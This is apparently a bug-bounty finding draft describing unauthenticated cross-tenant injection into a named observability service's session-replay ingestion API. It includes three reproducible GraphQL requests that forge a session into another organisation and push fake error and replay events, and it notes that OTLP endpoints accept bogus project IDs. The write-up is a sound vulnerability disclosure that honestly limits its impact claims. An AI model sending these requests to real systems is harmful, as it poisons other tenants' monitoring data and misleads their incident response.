# FINDING CANDIDATE: Unauthenticated Cross-Tenant Injection — LD Observability / Session Replay

## Summary
The LaunchDarkly Observability public ingestion GraphQL (pub.observability.app.ld.catamorphic.com)
accepts fully unauthenticated, attacker-controlled session-replay writes into ANY tenant,
keyed solely on client-supplied identifiers. No session, token, CSRF, or Origin validation.

Severity proposal: P3 (cross-tenant write/injection; NO read access demonstrated — read path
is account-scoped via LDProjectAuth and blocked in testing).

## Verified Attack Chain (all steps reproduced unauthenticated)
1. initializeSession — forged session into arbitrary org
   POST https://pub.observability.app.ld.catamorphic.com/
   Content-Type: application/json
   Origin: https://app.launchdarkly.com (attacker-chosen, accepted)

   {"query":"mutation InitializeSession($secure_id: String!, $org: String!, $client_id: String!) { initializeSession(session_secure_id: $secure_id, session_key: \"\", organization_verbose_id: $org, enable_strict_privacy: false, enable_recording_network_contents: true, clientVersion: \"test-1.0.0\", firstloadVersion: \"test-1.0.0\", clientConfig: \"{}\", environment: \"production\", appVersion: \"1.0.0\", serviceName: \"superz-test\", fingerprint: \"superz-fp-123\", client_id: $client_id) { secure_id } }",
    "variables":{"secure_id":"1jdkoe52-sztest-22222222-2222-4222-8222-222222222222","org":"1jdkoe52","client_id":"1jdkoe52"}}

   → 200 {"data":{"initializeSession":{"secure_id":"1jdkoe52-sztest-22222222-2222-4222-8222-222222222222"}}}
   (server ECHOED BACK the attacker-forged secure_id as canonical)

2. pushSessionEvents — fake error events
   {"query":"mutation { pushSessionEvents(session_secure_id: \"1jdkoe52-sztest-22222222-2222-4222-8222-222222222222\", payload_id: 1, data: \"[...attacker-controlled error JSON with message/type/url...]\") }"}
   → 200 {"data":{"pushSessionEvents":null}}

3. pushPayload — rrweb replay events (attacker-controlled DOM)
   {"query":"mutation { pushPayload(session_secure_id: \"...\", payload_id: 3, events: { events: [{ type: 4, timestamp: 1792673000.0, _sid: 0, data: { href: \"https://injected.example/admin\" } }] }, messages: \"{}\", resources: \"{\\\"requests\\\":[]}\", errors: [], has_session_unloaded: false, highlight_logs: \"[]\") }"}
   → 200 {"data":{"pushPayload":172}}

## Why this is cross-tenant
- organization_verbose_id is a plain GraphQL argument supplied by the client (SDK source:
  observability-sdk sdk/@launchdarkly/o11y/src/client/index.tsx — GraphQLClient headers: {},
  no auth token anywhere in ingestion path).
- Session secure_id format is client-generated: GenerateSecureID(`${organizationID}-${sessionKey}`).
- Victim's observabilityProjectID is embedded client-side in victim apps (not a secret).
- Real tenants' project IDs + the same 3 mutations = injected sessions appear in the victim's
  Session Replay UI and error monitoring.

## Read isolation (verified NOT broken)
- session(secure_id) via authenticated LD session (pri graph): "record not found" for foreign session
- LDProjectAuth middleware blocks GetProjects/workspaces enumeration for LD-linked accounts
- LDAccountID not client-controllable (header tests all rejected)
- project(id) returns null for projects not mapped to the caller's LD account

## Additional unverified-but-accepted primitives (same class)
- OTLP ingestion: POST https://otel.observability.app.ld.catamorphic.com/v1/traces|/v1/logs
  with Content-Type: application/json and "highlight.project_id" resource attribute →
  200 {"partialSuccess":{}} even for bogus project IDs (landing not verified)
- addSessionFeedback mutation exists (social-engineering UI vector; shape not fully verified)

## Impact (honest)
- Poisoned Session Replay data in victim tenants (fake user sessions, fake network captures,
  fake identities via identifySession)
- Fake errors → error-monitoring pollution → false alerts (incl. Vega auto-investigation token burn)
- Misleading data during incident response/triage
- NO cross-tenant data READ demonstrated

## Recommendations for report
- Frame as cross-tenant injection (program focus: Cross-Organization Isolation)
- Do NOT claim data exposure/ATO
- Include the 3 repro requests + read-isolation test results
